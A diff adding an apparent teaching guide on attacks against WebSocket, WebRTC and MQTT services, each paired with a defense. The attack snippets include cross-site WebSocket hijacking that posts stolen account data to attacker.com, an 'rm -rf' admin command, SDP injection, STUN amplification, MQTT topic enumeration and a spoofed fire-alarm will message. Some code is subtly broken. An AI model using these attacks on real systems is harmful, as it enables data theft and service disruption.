@@ -1,0 +1,519 @@
+### Insecure vs Secure Architectures
+Insecure RTC Architecture (what fails under pressure)
+Long-lived connections on ws:// or plaintext MQTT, exposing traffic to MitM and downgrade.
+Signaling that accepts stale or replayed tokens; no binding between token and negotiated session parameters.
+Open TURN servers allowing third-party relay; no rate limiting; no IP allowlist.
+Brokers with anonymous access, permissive wildcards, and no per-client ACLs.
+No quotas: single user can spawn thousands of connections, degrading service for all.
+Minimal telemetry: no visibility into ICE re-attempt storms, TURN spikes, or topic enumerations.
+
+### Secure-by-Design RTC Architecture (resilient by default)
+Enforce TLS 1.3 everywhere (wss://, mqtts://), DTLS/SRTP for media, QUIC where available.
+Short-lived, audience-bound tokens; bind tokens to session attributes (SDP fingerprint, room id, client id), and reject replays.
+Hardened TURN: credentials rotation, realm scoping, per-IP rate limits, IP allowlist, and metering for abuse.
+Broker hardening: mTLS or strong credentials, topic-level ACLs, least-privilege publishes/subscribes, disallow anonymous.
+Connection governance: rate limiting, backpressure, per-IP and per-user caps, circuit breakers, and adaptive QoS.
+Observability first: handshake outcomes, ICE path analytics, TURN allocation failure reasons, topic subscription diffs, and anomaly baselines.
+
+### WebSocket Origin Bypass Attack 
+Attack Implementation
+```
+// Attacker's malicious website
+const ws = new WebSocket('wss://victim.com/api/websocket', {
+    headers: {
+        'Origin': 'https://victim.com',
+        'User-Agent': 'Mozilla/5.0 (legitimate-looking)'
+    }
+});
+
+ws.onopen = function() {
+    // Send malicious commands
+    ws.send(JSON.stringify({
+        action: 'admin_command',
+        payload: 'rm -rf /important_data'
+    }));
+};
+```
+Defense Implementation:
+```
+const WebSocket = require('ws');
+
+const wss = new WebSocket.Server({
+    port: 8080,
+    verifyClient: (info) => {
+        const origin = info.origin;
+        const allowedOrigins = ['https://trusted-domain.com', 'https://app.company.com'];
+        
+        // Strict origin validation
+        if (!allowedOrigins.includes(origin)) {
+            console.log(`Blocked WebSocket from unauthorized origin: ${origin}`);
+            return false;
+        }
+        
+        return true;
+    }
+});
+```
+
+### WebSocket Connection Exhaustion Attack
+Attack Implementation:
+```
+// Attacker opens massive number of WebSocket connections
+for (let i = 0; i < 10000; i++) {
+    const ws = new WebSocket('wss://target.com/ws');
+    ws.onopen = () => {
+        // Keep connection alive but don't send data
+        setInterval(() => ws.ping(), 30000);
+    };
+}
+```
+
+Defense Implementation:
+```
+const rateLimit = require('ws-rate-limit');
+
+const wss = new WebSocket.Server({
+    port: 8080,
+    perMessageDeflate: false, // Disable compression to prevent zip bombs
+});
+
+// Rate limiting middleware
+const limiter = rateLimit({
+    max: 10, // Maximum 10 connections per minute per IP
+    window: 60 * 1000, // 1 minute window
+});
+
+wss.on('connection', (ws, req) => {
+    if (!limiter(req)) {
+        ws.close(1008, 'Rate limit exceeded');
+        return;
+    }
+    
+    // Connection timeout
+    const timeout = setTimeout(() => {
+        ws.terminate();
+    }, 300000); // 5 minutes
+    
+    ws.on('close', () => clearTimeout(timeout));
+});
+
+### Cross-Site WebSocket Hijacking Attack
+```
+<!-- Attacker's malicious page -->
+<script>
+const ws = new WebSocket('wss://bank.com/account-websocket');
+ws.onmessage = function(event) {
+    // Steal sensitive account data
+    const data = JSON.parse(event.data);
+    fetch('https://attacker.com/steal', {
+        method: 'POST',
+        body: JSON.stringify(data)
+    });
+};
+</script>
+```
+
+Defense Implementation:
+```
+const crypto = require('crypto');
+
+// WebSocket server with CSRF protection
+wss.on('connection', (ws, req) => {
+    const csrfToken = req.headers['x-csrf-token'];
+    
+    // Validate CSRF token
+    if (!validateCSRFToken(csrfToken, req.headers.cookie)) {
+        ws.close(1008, 'Invalid CSRF token');
+        return;
+    }
+    
+    // Additional authentication
+    const sessionId = extractSessionId(req.headers.cookie);
+    if (!isValidSession(sessionId)) {
+        ws.close(1008, 'Invalid session');
+        return;
+    }
+});
+```
+
+### WebRTC SDP Injection Attack
+SDP injection allows STUN/TURN server manipulation and media hijacking
+Attack Implementation:
+```
+// Malicious SDP injection
+const maliciousSDP = `v=0
+o=- 4611731400430051336 2 IN IP4 127.0.0.1
+s=-
+t=0 0
+a=group:BUNDLE audio video
+m=audio 9 UDP/TLS/RTP/SAVPF 111
+c=IN IP4 0.0.0.0
+a=rtcp:9 IN IP4 0.0.0.0
+a=ice-ufrag:malicious
+a=ice-pwd:injected_credentials
+a=fingerprint:sha-256 AA:BB:CC:DD:EE:FF:00:11:22:33:44:55:66:77:88:99
+a=setup:actpass
+a=mid:audio
+a=sendrecv
+a=rtcp-mux
+a=rtpmap:111 opus/48000/2
+a=candidate:foundation 1 udp 2113667326 attacker.com 54400 typ host`;
+
+// Inject malicious SDP through signaling server
+signalingSocket.emit('offer', { sdp: maliciousSDP, target: 'victim-peer-id' });
+```
+
+Defense Implementation:
+```
+// SDP validation and sanitization
+function validateSDP(sdp) {
+    const lines = sdp.split('\n');
+    const bannedIPs = ['0.0.0.0', '127.0.0.1', '::1'];
+    
+    for (const line of lines) {
+        if (line.startsWith('a=candidate:')) {
+            const parts = line.split(' ');
+            const ip = parts[4];
+            if (bannedIPs.includes(ip) || isPrivateIP(ip)) {
+                throw new Error('Invalid IP in SDP candidate');
+            }
+        }
+        
+        if (line.startsWith('a=ice-ufrag:') || line.startsWith('a=ice-pwd:')) {
+            if (line.length > 256) {
+                throw new Error('ICE credentials too long');
+            }
+        }
+    }
+    
+    return true;
+}
+
+// Signaling server with SDP validation
+io.on('connection', (socket) => {
+    socket.on('offer', (data) => {
+        try {
+            validateSDP(data.sdp);
+            socket.to(data.target).emit('offer', data);
+        } catch (error) {
+            socket.emit('error', 'Invalid SDP: ' + error.message);
+        }
+    });
+});
+```
+
+### WebRTC STUN Amplification Attack
+Attack Implementation:
+```
+// Amplification attack using STUN servers
+const dgram = require('dgram');
+
+const stunRequest = Buffer.from([
+    0x00, 0x01, // Message Type: Binding Request
+    0x00, 0x00, // Message Length
+    0x21, 0x12, 0xA4, 0x42, // Magic Cookie
+    0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0a, 0x0b
+]);
+
+const client = dgram.createSocket('udp4');
+const stunServers = ['stun.l.google.com:19302', 'stun1.l.google.com:19302'];
+
+stunServers.forEach(server => {
+    const [host, port] = server.split(':');
+    client.send(stunRequest, port, host);
+});
+```
+Defense Implementation:
+```
+// TURN server configuration with rate limiting
+const turnConfig = {
+    authMech: 'long-term',
+    credentials: {
+        username: process.env.TURN_USERNAME,
+        password: process.env.TURN_PASSWORD
+    },
+    maxAllocations: 10,
+    maxLifetime: 600, // 10 minutes
+    allowedIPs: process.env.ALLOWED_CLIENT_IPS?.split(',') || [],
+    deniedIPs: ['127.0.0.1', '0.0.0.0'],
+    maxBandwidth: 1048576 // 1MB/s per allocation
+};
+```
+
+### WebRTC Unbound Token Attack
+Attack Implementation:
+```
+// Attacker steals/reuses WebRTC tokens across sessions
+const stolenToken = 'eyJhbGciOiJIUzI1NiJ9.eyJyb29tIjoicHVibGljLXJvb20ifQ...';
+
+const pc = new RTCPeerConnection({
+    iceServers: [{
+        urls: 'turn:turn.example.com:3478',
+        username: 'stolen_user',
+        credential: stolenToken
+    }]
+});
+
+pc.ontrack = (event) => {
+    const mediaStream = event.streams[0];
+    sendToAttackerServer(mediaStream);
+};
+```
+Defense Implementation:
+```
+const jwt = require('jsonwebtoken');
+const crypto = require('crypto');
+
+// Generate bound WebRTC credentials
+function generateBoundCredentials(userId, roomId, sessionId) {
+    const timestamp = Math.floor(Date.now() / 1000);
+    const expiry = timestamp + 3600;
+    
+    const payload = {
+        userId, roomId, sessionId,
+        iat: timestamp, exp: expiry,
+        fingerprint: crypto.createHash('sha256')
+            .update(userId + roomId + sessionId + process.env.SECRET_KEY)
+            .digest('hex')
+    };
+    
+    return {
+        username: `${timestamp}:${userId}`,
+        credential: jwt.sign(payload, process.env.TURN_SECRET),
+        ttl: 3600
+    };
+}
+```
+
+### MQTT Security: Attack and Defense Techniques
+Attack Implementation:
+```
+const mqtt = require('mqtt');
+
+// Connect to poorly secured MQTT broker
+const client = mqtt.connect('mqtt://insecure-broker.com:1883');
+
+client.on('connect', () => {
+    // Subscribe to sensitive topics with wildcards
+    client.subscribe('company/+/secrets/#');
+    client.subscribe('devices/+/commands');
+    client.subscribe('users/+/location');
+    
+    // Publish malicious commands to device topics
+    client.publish('devices/temperature_sensor_1/command', JSON.stringify({
+        action: 'shutdown',
+        force: true
+    }));
+    
+    // Topic enumeration attack
+    client.subscribe('$SYS/broker/clients/+/connected');
+});
+
+client.on('message', (topic, message) => {
+    console.log(`Intercepted: ${topic} -> ${message.toString()}`);
+    sendToAttacker(topic, message.toString());
+});
+```
+Defense Implementation:
+```
+// mosquitto.conf - Secure MQTT broker configuration
+const mosquittoConfig = `
+# Security settings
+allow_anonymous false
+password_file /etc/mosquitto/passwords
+acl_file /etc/mosquitto/acls
+
+# TLS configuration
+listener 8883
+cafile /etc/ssl/certs/ca.crt
+certfile /etc/ssl/certs/server.crt
+keyfile /etc/ssl/private/server.key
+require_certificate true
+use_identity_as_username true
+
+# Rate limiting
+max_connections 1000
+max_connections_per_ip 10
+message_size_limit 1048576
+`;
+
+// ACL configuration
+const aclConfig = `
+# Default deny all
+topic deny #
+
+# Device-specific permissions
+user device_sensor_001
+topic readwrite devices/sensor_001/+
+topic read devices/sensor_001/status
+
+user admin_user
+topic readwrite company/admin/#
+topic read $SYS/broker/+
+
+# User-specific permissions  
+pattern read users/%u/notifications
+pattern write users/%u/commands
+`;
+```
+
+### MQTT Anonymous Access Attack
+Attack Implementation:
+```
+// Anonymous connection to unsecured broker
+const client = mqtt.connect('mqtt://vulnerable-iot-broker.com:1883');
+
+client.on('connect', () => {
+    console.log('Anonymous access granted!');
+    
+    // Discover all active topics
+    client.subscribe('#'); // Subscribe to everything
+    
+    // Enumerate system topics
+    client.subscribe('$SYS/#');
+    
+    // Try common IoT device patterns
+    const commonTopics = [
+        'home/+/temperature',
+        'factory/+/sensors/#',
+        'building/+/hvac/control',
+        'vehicle/+/location',
+        'medical/+/vitals'
+    ];
+    
+    commonTopics.forEach(topic => {
+        client.subscribe(topic);
+    });
+});
+```
+Defense Implementation:
+```
+// Secure MQTT broker setup
+const aedes = require('aedes')();
+const server = require('net').createServer(aedes.handle);
+
+// Authentication handler
+aedes.authenticate = (client, username, password, callback) => {
+    if (!username || !password) {
+        const error = new Error('Authentication required');
+        error.returnCode = 4;
+        return callback(error, null);
+    }
+    
+    const isValid = validateCredentials(username, password.toString());
+    
+    if (isValid) {
+        client.user = username;
+        client.permissions = getUserPermissions(username);
+        callback(null, true);
+    } else {
+        const error = new Error('Invalid credentials');
+        error.returnCode = 4;
+        callback(error, null);
+    }
+};
+
+// Authorization handler for publish
+aedes.authorizePublish = (client, packet, callback) => {
+    const topic = packet.topic;
+    
+    if (!hasPublishPermission(client.permissions, topic)) {
+        const error = new Error('Publish not authorized');
+        error.returnCode = 135;
+        return callback(error);
+    }
+    
+    if (packet.payload.length > 1048576) {
+        return callback(new Error('Payload too large'));
+    }
+    
+    callback(null);
+};
+
+server.listen(1883, () => {
+    console.log('Secure MQTT broker started on port 1883');
+});
+```
+
+### MQTT Will Message Attack
+Attack Implementation:
+```
+// Malicious client with weaponized will message
+const client = mqtt.connect('mqtt://broker.com:1883', {
+    username: 'compromised_device',
+    password: 'stolen_password',
+    will: {
+        topic: 'emergency/building/fire_alarm',
+        payload: JSON.stringify({
+            alert: 'FIRE_DETECTED',
+            location: 'SERVER_ROOM',
+            timestamp: new Date().toISOString(),
+            evacuate: true
+        }),
+        qos: 2,
+        retain: true
+    }
+});
+
+// Client disconnects unexpectedly, triggering will message
+setTimeout(() => {
+    client.stream.destroy();
+}, 5000);
+```
+Defense Implementation:
+```
+// Secure will message handling
+aedes.authenticate = (client, username, password, callback) => {
+    if (isValid) {
+        client.user = username;
+        client.permissions = getUserPermissions(username);
+        
+        if (client.will) {
+            const willValid = validateWillMessage(client.will, client.permissions);
+            if (!willValid) {
+                const error = new Error('Invalid will message');
+                return callback(error, null);
+            }
+        }
+        
+        callback(null, true);
+    }
+};
+
+function validateWillMessage(will, permissions) {
+    if (!hasPublishPermission(permissions, will.topic)) {
+        return false;
+    }
+    
+    try {
+        const payload = JSON.parse(will.payload);
+        
+        const criticalTopics = ['emergency/', 'alarm/', 'safety/', 'security/', 'admin/'];
+        const isCritical = criticalTopics.some(topic => will.topic.startsWith(topic));
+        
+        if (isCritical) {
+            if (!payload.source_verified || !payload.digital_signature) {
+                return false;
+            }
+        }
+        
+        if (will.payload.length > 1024) {
+            return false;
+        }
+        
+        return true;
+    } catch (error) {
+        return false;
+    }
+}
+
+// Monitor will message triggers
+aedes.on('clientDisconnect', (client) => {
+    if (client.will) {
+        const isCritical = client.will.topic.match(/^(emergency|alarm|safety)/);
+        if (isCritical) {
+            alertSecurityTeam(`Critical will message from ${client.id}`, client.will);
+        }
+    }
+});
+```
